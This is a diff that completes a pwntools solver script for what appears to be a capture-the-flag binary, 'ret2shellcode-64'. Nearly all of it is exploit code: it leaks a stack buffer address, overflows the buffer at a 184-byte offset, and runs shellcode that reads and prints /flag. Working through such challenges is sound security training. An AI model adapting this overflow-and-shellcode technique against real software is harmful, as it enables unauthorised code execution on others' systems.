@@ -6,7 +6,7 @@ from pwn import *
 
 # File executable target
 
-exe = "./chall" 
+exe = "/challenge/ret2shellcode-64" 
 elf = ELF(exe)
 context.binary = elf
 context.arch = elf.arch
@@ -16,23 +16,28 @@ context.log_level = "debug"
 # CONNECTION
 # ==========================================
 
-process(BINARY)
-
+io = process(exe)
 
 # ==========================================
 # EXPLOIT / SOLVER
 # ==========================================
 
 def exploit(io):
+    offset = 184 # 0xb0 + 8 saved return adress
     
-    """
-    Function to run exploitation
+    sc = shellcraft.open('/flag')
+    sc += shellcraft.read(3 , 'rsp' , 0x340)
+    sc += shellcraft.write(1 , 'rsp' , 'rax')
     
-    Writing your exploitation logic steps in here
+    io.recvuntil(b'buff sits at ')
+    buf_addr = int(io.recvline(), 16)
     
-    Parameter:
-    io: connection
-    """
+    payload  = asm(sc).ljust(offset, b'A') + p64(buf_addr)
+    
+    io.recvuntil(b"Speak: ")
+    io.sendline(payload)
+
+    print(io.recvall().decode(errors='ignore'))
 
 
 # ==========================================
@@ -40,8 +45,6 @@ def exploit(io):
 # ==========================================
 
 def main():
-
-    io = start()
 
     exploit(io)
     
